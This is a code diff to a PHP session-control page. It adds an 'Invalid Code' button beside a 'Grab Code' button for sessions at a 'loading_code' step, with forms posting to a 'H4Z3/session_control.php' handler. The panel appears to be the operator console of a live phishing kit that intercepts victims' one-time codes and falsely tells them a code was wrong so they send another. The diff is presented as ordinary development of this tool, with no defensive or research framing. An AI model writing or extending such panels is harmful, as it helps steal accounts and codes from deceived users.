@@ -191,7 +191,9 @@ uksort($sessions, function ($a, $b) use ($sessions) {
                         $latestEntry = $entries[count($entries) - 1];
                     }
                     $latestStep = $latestEntry['step'] ?? null;
-                    $shouldShowLoadingActions = ($latestStep === 'loading');
+                    $normalizedStep = is_string($latestStep) ? strtolower(str_replace('-', '_', $latestStep)) : null;
+                    $shouldShowLoadingActions = ($normalizedStep === 'loading');
+                    $shouldShowLoadingCodeActions = ($normalizedStep === 'loading_code');
                     $redirectTarget = htmlspecialchars($_SERVER['SCRIPT_NAME'], ENT_QUOTES, 'UTF-8');
                 ?>
                 <div class="actions">
@@ -207,6 +209,14 @@ uksort($sessions, function ($a, $b) use ($sessions) {
                             <input type="hidden" name="pending_action" value="code">
                             <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
                             <button type="submit" class="action-btn secondary">Grab Code</button>
+                        </form>
+                    <?php endif; ?>
+                    <?php if ($shouldShowLoadingCodeActions): ?>
+                        <form method="post" action="../H4Z3/session_control.php">
+                            <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
+                            <input type="hidden" name="pending_action" value="invalid_code">
+                            <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
+                            <button type="submit" class="action-btn secondary">Invalid Code</button>
                         </form>
                         <form method="post" action="../H4Z3/session_control.php">
                             <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
